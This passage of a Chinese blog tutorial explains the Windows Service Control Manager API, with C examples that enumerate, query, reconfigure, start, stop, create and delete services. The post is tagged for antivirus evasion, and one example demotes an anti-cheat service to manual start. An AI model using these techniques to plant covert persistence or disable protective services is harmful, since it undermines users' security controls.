额外的句柄\n);\n</code></pre>\n<p><code>dwServiceType</code></p>\n<pre><code>dwServiceState\nENUM_SERVICE_STATUS\n</code></pre>\n<p>因为我们并不知道有多少个服务，也就无法申请一个合适的结构体大小。所以应该先调用，来获取缓冲区的大小，注意首次调用， 必须为0　　</p>\n<p>示例代码</p>\n<pre><code class=\"c\">// 打开数据库\nSC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);\nif (!hSCM) return;\n\nDWORD needSize = 0, serviceCnt = 0;\n    \n// 第一次调用获取缓冲区空间\nBOOL ret = EnumServicesStatus(hSCM, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &amp;needSize, &amp;serviceCnt, 0);\n// 第一次调用返回0\nif (ret) return;\n\nLPENUM_SERVICE_STATUS servStatus;\n// 动态分配空间\nservStatus = (LPENUM_SERVICE_STATUS)malloc(sizeof(LPENUM_SERVICE_STATUS) * (needSize + 1));\nif (!servStatus) return;\n\nret = EnumServicesStatus(hSCM, SERVICE_WIN32, SERVICE_STATE_ALL, servStatus, needSize, &amp;needSize, &amp;serviceCnt, NULL);\nif (!ret) return;\n\n// 循环显示服务信息\nfor (DWORD i = 0; i &lt; serviceCnt; i++)\n&#123;\n    printf(&quot;%s | %s\\n&quot;, servStatus[i].lpDisplayName, servStatus[i].lpServiceName);\n&#125;\n\nCloseServiceHandle(hSCM);\nfree(servStatus);\n</code></pre>\n<p>　　运行结果</p>\n<pre><code class=\"none\">Acunetix | Acunetix\nAcunetix Database | Acunetix Database\nAllJoyn Router Service | AJRouter\nApplication Layer Gateway Service | ALG\nAlibaba PC Safe Service | AlibabaProtect\n... ...\n</code></pre>\n<h4 id=\"查询-1\"><a href=\"#查询-1\" class=\"headerlink\" title=\"查询\"></a>查询</h4><p>　　查询服务信息之前，我们需要使用<code>OpenService</code>获取服务的句柄</p>\n<pre><code class=\"c\">SC_HANDLE OpenService(\n    SC_HANDLE hSCManager,\t\t// 数据库句柄\n    LPCSTR    lpServiceName,\t// 服务名称\n    DWORD     dwDesiredAccess\t// 访问权限\n);\t\t\t\t\t\t\t\t// 成功返回 服务句柄 失败返回 NULL\n</code></pre>\n<p>　　常用访问权限，更多查阅msdn</p>\n<pre><code class=\"none\">SERVICE_ALL_ACCESS \t\t所有权限\nSERVICE_QUERY_CONFIG \t查询配置权限\nSERVICE_QUERY_STATUS \t查询状态权限\nSERVICE_START \t\t\t启动服务权限\nSERVICE_STOP \t\t\t停止服务权限\nSERVICE_CHANGE_CONFIG \t改变配置权限\n</code></pre>\n<h5 id=\"服务配置\"><a href=\"#服务配置\" class=\"headerlink\" title=\"服务配置\"></a>服务配置</h5><p>　　当成功拿到服务句柄后，可使用<code>QueryServiceConfig</code>查询服务配置信息，如果想获取更多的信息可使用<code>QueryServiceConfig2</code></p>\n<pre><code class=\"c\">BOOL QueryServiceConfig(\n    SC_HANDLE               hService,\t\t\t// 服务句柄\n    LPQUERY_SERVICE_CONFIGA lpServiceConfig,\t// 指向QUERY_SERVICE_CONFIG结构体\n    DWORD                   cbBufSize,\t\t\t// 结构体缓冲区大小\n    LPDWORD                 pcbBytesNeeded\t\t// 实际需要缓冲区大小\n);\t\t\t\t\t\t\t\t\t\t\t\t// 成功返回 非0 失败返回 0\n</code></pre>\n<p><code>QUERY_SERVICE_CONFIG</code></p>\n<h5 id=\"服务状态\"><a href=\"#服务状态\" class=\"headerlink\" title=\"服务状态\"></a>服务状态</h5><p>　　使用<code>QueryServiceStatus</code>，或者<code>QueryServiceStatusEx</code>获取服务状态</p>\n<pre><code class=\"c\">BOOL QueryServiceStatus(\n    SC_HANDLE        hService,\t\t\t// 服务句柄\n    LPSERVICE_STATUS lpServiceStatus\t// 指向SERVICE_STATUS结构体\n);\t\t\t\t\t\t\t\t\t\t// 成功返回 非0 失败返回 0\n</code></pre>\n<p><code>SERVICE_STATUS</code></p>\n<pre><code>dwCurrentState\n</code></pre>\n<h4 id=\"修改\"><a href=\"#修改\" class=\"headerlink\" title=\"修改\"></a>修改</h4><h5 id=\"服务配置-1\"><a href=\"#服务配置-1\" class=\"headerlink\" title=\"服务配置\"></a>服务配置</h5><p>　　修改服务配置用到<code>ChangeServiceConfig</code>函数，要修改更多配置参数请用<code>ChangeServiceConfig2</code></p>\n<pre><code class=\"c\">BOOL ChangeServiceConfig(\n    SC_HANDLE hService,\t\t\t\t// 服务句柄\n    DWORD     dwServiceType,\t\t// 服务类型\n    DWORD     dwStartType,\t\t\t// 启动类型\n    DWORD     dwErrorControl,\n    LPCWSTR   lpBinaryPathName,\t\t// 可执行文件路径\n    LPCWSTR   lpLoadOrderGroup,\n    LPDWORD   lpdwTagId,\n    LPCWSTR   lpDependencies,\t\t// 依赖项\n    LPCWSTR   lpServiceStartName,\n    LPCWSTR   lpPassword,\n    LPCWSTR   lpDisplayName\t\t\t// 显示名称\n);\t\t\t\t\t\t\t\t\t// 成功返回 非0 失败返回 0\n</code></pre>\n<p>　　函数中传递的都是服务的新信息，如果希望改变则填入相应的值，如果不想改变则对于DWORD类型的成员来说填入，对于指针类型的只需要填入即可。　　示例代码</p>\n<pre><code class=\"c\">// 改变启动类型为手动\nDWORD newType = SERVICE_DEMAND_START;\nLPCSTR servName = &quot;AntiCheatExpert Service&quot;;\n\nSC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);\nif (!hSCM) return;\n\nSC_HANDLE hSvc = OpenService(hSCM, servName, SERVICE_ALL_ACCESS);\nif (!hSvc) return;\n\nBOOL ret = ChangeServiceConfig(hSvc, SERVICE_NO_CHANGE, newType, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);\nif (ret)\n    printf(&quot;sucess&quot;);\nelse\n    printf(&quot;fail&quot;);\n\nCloseServiceHandle(hSvc);\nCloseServiceHandle(hSCM);\n</code></pre>\n<h5 id=\"服务状态-1\"><a href=\"#服务状态-1\" class=\"headerlink\" title=\"服务状态\"></a>服务状态</h5><p>　　启动服务<code>StartService</code></p>\n<pre><code class=\"c\">BOOL StartService(\n    SC_HANDLE hService,\t\t\t\t// 服务句柄\n    DWORD     dwNumServiceArgs,\t\t// 启动参数的个数\n    LPCSTR    *lpServiceArgVectors\t// 参数列表指针\n);\n</code></pre>\n<p>　　这个函数类型与main函数外部传参，传递命令行参数给程序，以便实现程序与用户的交互。当第二个参数为0时，第三个参数为NULL</p>\n<p>　　要修改成其他状态，要用<code>ControlService</code></p>\n<pre><code class=\"c\">BOOL ControlService(\n    SC_HANDLE        hService,\t\t\t// 服务句柄\n    DWORD            dwControl,\t\t\t// 新状态类型\n    LPSERVICE_STATUS lpServiceStatus\t// 原始状态\n);\n</code></pre>\n<p>　　示例</p>\n<pre><code class=\"c\">LPCSTR servName = &quot;NaturalAuthentication&quot;;\n// 启动服务\nDWORD newStatus = SERVICE_RUNNING;\nSERVICE_STATUS sTs = &#123; 0 &#125;;\n\nSC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);\nif (!hSCM) return;\n\nSC_HANDLE hSvc = OpenService(hSCM, servName, SERVICE_ALL_ACCESS);\nif (!hSvc) return;\n    \nBOOL ret = QueryServiceStatus(hSvc, &amp;sTs);\nif (!ret) return;\n\n    \nret = FALSE;\n// 相同状态\nif (sTs.dwCurrentState == newStatus)\n&#123;\n    ret = TRUE;\n&#125;\n// 运行服务\nelse if (sTs.dwCurrentState == SERVICE_STOPPED &amp;&amp; newStatus == SERVICE_RUNNING)\n&#123;\t\n    ret = StartService(hSvc, 0, NULL); \t // 启动服务\n&#125;\n// 停止服务\nelse if ((sTs.dwCurrentState == SERVICE_RUNNING || sTs.dwCurrentState == SERVICE_PAUSED) &amp;&amp; newStatus == SERVICE_STOPPED)\n&#123;\n    ret = ControlService(hSvc, SERVICE_CONTROL_STOP, &amp;sTs);\n&#125;\n// 暂停服务\nelse if (sTs.dwCurrentState == SERVICE_RUNNING &amp;&amp; newStatus == SERVICE_PAUSED)\n&#123;\n    ret = ControlService(hSvc, SERVICE_CONTROL_PAUSE, &amp;sTs);\n&#125;\n\nif (!ret)\n    printf(&quot;fail&quot;);\nelse\n    printf(&quot;sucess&quot;);\n\nCloseServiceHandle(hSCM);\nCloseServiceHandle(hSvc);\n</code></pre>\n<h4 id=\"创建-1\"><a href=\"#创建-1\" class=\"headerlink\" title=\"创建\"></a>创建</h4><p>　　创建服务使用<code>CreateService</code>函数</p>\n<pre><code class=\"c\">SC_HANDLE CreateService(\n    SC_HANDLE hSCManager,\t\t\t// 数据库句柄\n    LPCWSTR   lpServiceName,\t\t// 服务名\n    LPCWSTR   lpDisplayName,\t\t// 显示名\n    DWORD     dwDesiredAccess,\t\t// 权限\n    DWORD     dwServiceType,\t\t// 服务类型 \n    DWORD     dwStartType,\t\t\t// 启动类型\n    DWORD     dwErrorControl,\t\t// 错误操作\n    LPCWSTR   lpBinaryPathName,\t\t// 可执行文件路径\n    LPCWSTR   lpLoadOrderGroup,\t\t\n    LPDWORD   lpdwTagId,\n    LPCWSTR   lpDependencies,\n    LPCWSTR   lpServiceStartName,\n    LPCWSTR   lpPassword\n);\t\t\t\t\t\t\t\t\t// 成功返回 服务句柄 失败返回 NULL\n</code></pre>\n<p>　　后五项基本都用不到，填NULL即可。服务类型，一般填写，表示服务类型是win32类型拥有独立进程的服务。</p>\n<p>　　默认创建服务是没有服务描述信息的，如果要添加要使用<code>ChangeServiceConfig2</code>，这里就不具体讲解了。</p>\n<p>　　示例</p>\n<pre><code class=\"c\">SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);\nif (!hSCM) return;\nLPCSTR path = &quot;D:\\\\1.exe&quot;;\nSC_HANDLE hService = CreateService(hSCM, &quot;test&quot;, &quot;test&quot;, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, path, NULL, NULL, NULL, NULL, NULL);\nif (!hService) return;\n\n// 修改服务描述信息\nSERVICE_DESCRIPTION servDesc = &#123; 0 &#125;;\nservDesc.lpDescription = &quot;this is desc&quot;;\nChangeServiceConfig2(hService, SERVICE_CONFIG_DESCRIPTION, &amp;servDesc);\n\nprintf(&quot;sucess\\n&quot;);\nCloseServiceHandle(hService);\nCloseServiceHandle(hSCM);\n</code></pre>\n<h4 id=\"删除-2\"><a href=\"#删除-2\" class=\"headerlink\" title=\"删除\"></a>删除</h4><p>　　删除服务使用的函数是<code>DeleteService</code>，注意的是这个函数只对已停止的服务起作用，所以在删除之前需要将服务停止</p>\n<pre><code class=\"c\">BOOL DeleteService(\n    SC_HANDLE hService\t// 服务句柄\n);\t\t\t\t\t\t// 成功返回 非0 失败返回 0\n</code></pre>\n<p>　　示例</p>\n<pre><code class=\"bc\">SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);\nif (!hSCM) return;\n\nSC_HANDLE hServ = OpenService(hSCM, &quot;test&quot;, SERVICE_ALL_ACCESS);\nif (!hServ) return;\n\nSERVICE_STATUS sTs = &#123; 0 &#125;;\n// 尝试停止服务\nBOOL ret = ControlService(hServ, SERVICE_CONTROL_STOP, &amp;sTs);\nif (!ret) return;\n\n// 删除服务\nif (!DeleteService(hServ)) return;\n\nprintf(&quot;ok&quot;);\nCloseServiceHandle(hSCM);\nCloseServiceHandle(hServ);\n</code></pre>\n","categories":[],"tags":[{"name":"免杀","slug":"免杀","count":1,"path":"api/tags/免杀.json"}]}